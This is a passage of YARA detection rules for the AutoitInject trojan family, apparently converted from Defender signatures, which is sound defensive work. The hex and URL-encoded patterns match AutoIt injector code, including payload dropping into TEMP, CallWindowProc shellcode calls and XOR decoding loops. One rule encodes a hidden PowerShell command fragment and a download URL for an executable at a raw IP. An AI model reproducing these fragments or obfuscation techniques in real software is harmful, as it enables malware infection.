        $x_4_11 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-40] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-40] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_12 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-40] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-40] 22 20 2c 20 31 20 29}  //weight: 4, accuracy: Low
        $x_4_13 = {28 00 20 00 22 00 47 00 30 00 23 00 22 00 20 00 29 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 2b 00 20 00 39 00 31 00 33 00 36 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 47 00 30 00 23 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 47 00 30 00 23 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 47 00 30 00 23 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 47 00 30 00 23 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_14 = {28 20 22 47 30 23 22 20 29 20 2c 20 24 [0-30] 20 2b 20 39 31 33 36 20 2c 20 [0-30] 20 28 20 22 47 30 23 22 20 29 20 2c 20 30 20 2c 20 [0-30] 20 28 20 22 47 30 23 22 20 29 20 2c 20 30 20 2c 20 [0-30] 20 28 20 22 47 30 23 22 20 29 20 2c 20 30 20 2c 20 [0-30] 20 28 20 22 47 30 23 22 20 29 20 2c 20 30 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 8 of ($x_2_*))) or
            ((2 of ($x_4_*) and 6 of ($x_2_*))) or
            ((3 of ($x_4_*) and 4 of ($x_2_*))) or
            ((4 of ($x_4_*) and 2 of ($x_2_*))) or
            ((5 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AQYA_2147945484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AQYA!MTB"
        threat_id = "2147945484"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "%50%6f%77%65%72%53%68%65%6c%6c%20%2d%57%69%6e%64%6f%77%53%74%79%6c%65%20%48%69%64%64%65%6e%20%24%64%3d%24%65%6e%76%3a%" ascii //weight: 2
        $x_4_2 = "%68%74%74%70%3a%2f%2f%31%37%36%2e%34%36%2e%31%35%37%2e%33%32%2f%74%65%73%74%6d%69%6e%65%2f%72%61%6e%64%6f%6d%2e%65%78%65%" ascii //weight: 4
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AYYA_2147945741_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AYYA!MTB"
        threat_id = "2147945741"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-30] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-30] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-30] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-30] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {46 00 49 00 4c 00 45 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-30] 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {46 49 4c 45 52 45 41 44 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-30] 22 20 29}  //weight: 2, accuracy: Low
        $x_4_5 = {44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 53 00 45 00 54 00 44 00 41 00 54 00 41 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 31 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_6 = {44 4c 4c 53 54 52 55 43 54 53 45 54 44 41 54 41 20 28 20 24 [0-30] 20 2c 20 31 20 2c 20 24 [0-30] 20 29}  //weight: 4, accuracy: Low
        $x_4_7 = {26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-30] 20 00 29 00 20 00 26 00}  //weight: 4, accuracy: Low
        $x_4_8 = {26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-30] 20 29 20 26}  //weight: 4, accuracy: Low
        $x_4_9 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 75 00 73 00 65 00 72 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 22 00 43 00 61 00 6c 00 6c 00 57 00 22 00 20 00 26 00 20 00 22 00 69 00 6e 00 64 00 6f 00 77 00 22 00 20 00 26 00 20 00 22 00 50 00 72 00 6f 00 63 00 22 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 2b 00 20 00 39 00 31 00 33 00 36 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00}  //weight: 4, accuracy: Low
        $x_4_10 = {44 4c 4c 43 41 4c 4c 20 28 20 22 75 73 65 72 33 32 2e 64 6c 6c 22 20 2c 20 22 70 74 72 22 20 2c 20 22 43 61 6c 6c 57 22 20 26 20 22 69 6e 64 6f 77 22 20 26 20 22 50 72 6f 63 22 20 2c 20 22 70 74 72 22 20 2c 20 24 [0-30] 20 2b 20 39 31 33 36 20 2c 20 22 70 74 72 22 20 2c 20 30 20 2c 20 22 70 74 72 22 20 2c 20 30 20 2c 20 22 70 74 72 22}  //weight: 4, accuracy: Low
        $x_4_11 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 32 00 35 00 36 00 20 00 2d 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_12 = {26 3d 20 43 48 52 20 28 20 32 35 36 20 2d 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-30] 20 2c 20 24 [0-30] 20 2c 20 31 20 29 20 29 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_4_*) and 4 of ($x_2_*))) or
            ((4 of ($x_4_*) and 2 of ($x_2_*))) or
            ((5 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ATZA_2147946551_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ATZA!MTB"
        threat_id = "2147946551"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "28"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-30] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-30] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-30] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-30] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {46 00 49 00 4c 00 45 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-30] 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {46 49 4c 45 52 45 41 44 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-30] 22 20 29}  //weight: 2, accuracy: Low
        $x_4_5 = {44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 53 00 45 00 54 00 44 00 41 00 54 00 41 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 31 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_6 = {44 4c 4c 53 54 52 55 43 54 53 45 54 44 41 54 41 20 28 20 24 [0-30] 20 2c 20 31 20 2c 20 24 [0-30] 20 29}  //weight: 4, accuracy: Low
        $x_4_7 = {42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-30] 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_8 = {42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-30] 20 29}  //weight: 4, accuracy: Low
        $x_4_9 = {3d 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_10 = {3d 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-30] 20 2c 20 24 [0-30] 20 2c 20 31 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_11 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 24 00 [0-30] 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_12 = {26 3d 20 43 48 52 20 28 20 42 49 54 58 4f 52 20 28 20 24 [0-30] 20 2c 20 24 [0-30] 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_13 = {3d 00 20 00 4d 00 4f 00 44 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2b 00 20 00 31 00 33 00 20 00 2c 00 20 00 32 00 35 00 36 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_14 = {3d 20 4d 4f 44 20 28 20 24 [0-30] 20 2b 20 31 33 20 2c 20 32 35 36 20 29}  //weight: 4, accuracy: Low
        $x_4_15 = {53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 24 00 [0-30] 20 00 2b 00 20 00 31 00 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 3c 00 3e 00 20 00 22 00 22 00}  //weight: 4, accuracy: Low
        $x_4_16 = {53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-30] 20 2c 20 24 [0-30] 20 2b 20 31 20 2c 20 31 20 29 20 3c 3e 20 22 22}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_4_*) and 4 of ($x_2_*))) or
            ((6 of ($x_4_*) and 2 of ($x_2_*))) or
            ((7 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ASBB_2147948567_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASBB!MTB"
        threat_id = "2147948567"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-50] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-50] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-50] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-50] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {28 00 20 00 46 00 49 00 4c 00 45 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-50] 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {28 20 46 49 4c 45 52 45 41 44 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-50] 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-50] 20 00 28 00}  //weight: 2, accuracy: Low
        $x_2_6 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-50] 20 28}  //weight: 2, accuracy: Low
        $x_4_7 = {26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-50] 20 00 29 00 20 00 26 00}  //weight: 4, accuracy: Low
        $x_4_8 = {26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-50] 20 29 20 26}  //weight: 4, accuracy: Low
        $x_4_9 = {41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_10 = {41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-50] 20 2c 20 24 [0-50] 20 2c 20 31 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_11 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 24 00 [0-50] 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_12 = {26 3d 20 43 48 52 20 28 20 42 49 54 58 4f 52 20 28 20 24 [0-50] 20 2c 20 24 [0-50] 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_13 = {3d 00 20 00 4d 00 4f 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2b 00 20 00 31 00 33 00 20 00 2c 00 20 00 32 00 35 00 36 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_14 = {3d 20 4d 4f 44 20 28 20 24 [0-50] 20 2b 20 31 33 20 2c 20 32 35 36 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_4_*) and 5 of ($x_2_*))) or
            ((4 of ($x_4_*) and 3 of ($x_2_*))) or
            ((5 of ($x_4_*) and 1 of ($x_2_*))) or
            ((6 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AKCB_2147949074_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AKCB!MTB"
        threat_id = "2147949074"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_2 = {41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-50] 20 2c 20 24 [0-50] 20 2c 20 31 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_3 = {42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 24 00 [0-50] 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_4 = {42 49 54 58 4f 52 20 28 20 24 [0-50] 20 2c 20 24 [0-50] 20 29}  //weight: 4, accuracy: Low
        $x_4_5 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 24 00 [0-50] 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_6 = {26 3d 20 43 48 52 20 28 20 24 [0-50] 20 29}  //weight: 4, accuracy: Low
        $x_4_7 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-50] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-50] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_8 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-50] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-50] 22 20 2c 20 31 20 29}  //weight: 4, accuracy: Low
        $x_2_9 = {28 00 20 00 46 00 49 00 4c 00 45 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-50] 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_10 = {28 20 46 49 4c 45 52 45 41 44 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-50] 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_11 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-50] 20 00 28 00}  //weight: 2, accuracy: Low
        $x_2_12 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-50] 20 28}  //weight: 2, accuracy: Low
        $x_2_13 = {26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-50] 20 00 29 00 20 00 26 00}  //weight: 2, accuracy: Low
        $x_2_14 = {26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-50] 20 29 20 26}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_4_*) and 5 of ($x_2_*))) or
            ((4 of ($x_4_*) and 3 of ($x_2_*))) or
            ((5 of ($x_4_*) and 1 of ($x_2_*))) or
            ((6 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ARDB_2147950531_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ARDB!MTB"
        threat_id = "2147950531"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 4d 00 4f 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-50] 20 00 29 00 20 00 29 00 20 00 2b 00 20 00 31 00 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_2 = {41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-50] 20 2c 20 4d 4f 44 20 28 20 24 [0-50] 20 2c 20 53 54 52 49 4e 47 4c 45 4e 20 28 20 24 [0-50] 20 29 20 29 20 2b 20 31 20 2c 20 31 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_3 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00 20 00 2c 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 24 00 [0-50] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00 20 00 2c 00 20 00 32 00 35 00 35 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_4 = {26 3d 20 43 48 52 20 28 20 42 49 54 58 4f 52 20 28 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-50] 20 2c 20 24 [0-50] 20 2c 20 31 20 29 20 29 20 2c 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-50] 20 2c 20 24 [0-50] 20 2c 20 31 20 29 20 29 20 2c 20 32 35 35 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_5 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-50] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-50] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_6 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-50] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-50] 22 20 2c 20 31 20 29}  //weight: 4, accuracy: Low
        $x_2_7 = {28 00 20 00 46 00 49 00 4c 00 45 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-50] 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_8 = {28 20 46 49 4c 45 52 45 41 44 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-50] 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_4_9 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 42 00 69 00 74 00 22 00 20 00 26 00 20 00 22 00 58 00 22 00 20 00 26 00 20 00 22 00 4f 00 52 00 28 00 24 00 [0-50] 2c 00 20 00 24 00 [0-50] 29 00 22 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_10 = {45 58 45 43 55 54 45 20 28 20 22 42 69 74 22 20 26 20 22 58 22 20 26 20 22 4f 52 28 24 [0-50] 2c 20 24 [0-50] 29 22 20 29}  //weight: 4, accuracy: Low
        $x_2_11 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-50] 20 00 28 00}  //weight: 2, accuracy: Low
        $x_2_12 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-50] 20 28}  //weight: 2, accuracy: Low
        $x_2_13 = {26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-50] 20 00 29 00 20 00 26 00}  //weight: 2, accuracy: Low
        $x_2_14 = {26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-50] 20 29 20 26}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_4_*) and 5 of ($x_2_*))) or
            ((4 of ($x_4_*) and 3 of ($x_2_*))) or
            ((5 of ($x_4_*) and 1 of ($x_2_*))) or
            ((6 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AJEB_2147951282_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AJEB!MTB"
        threat_id = "2147951282"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {44 00 49 00 4d 00 20 00 24 00 [0-50] 3d 00 20 00 5b 00 20 00 22 00 43 00 76 00 62 00 46 00 6f 00 56 00 2e 00 65 00 78 00 65 00 22 00 20 00 2c 00 20 00 22 00}  //weight: 4, accuracy: Low
        $x_4_2 = {44 49 4d 20 24 [0-50] 3d 20 5b 20 22 43 76 62 46 6f 56 2e 65 78 65 22 20 2c 20 22}  //weight: 4, accuracy: Low
        $x_1_3 = "SHELLEXECUTE ( @WORKINGDIR &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 1 of ($x_1_*))) or
            ((2 of ($x_4_*))) or
            (all of ($x*))
        )
}

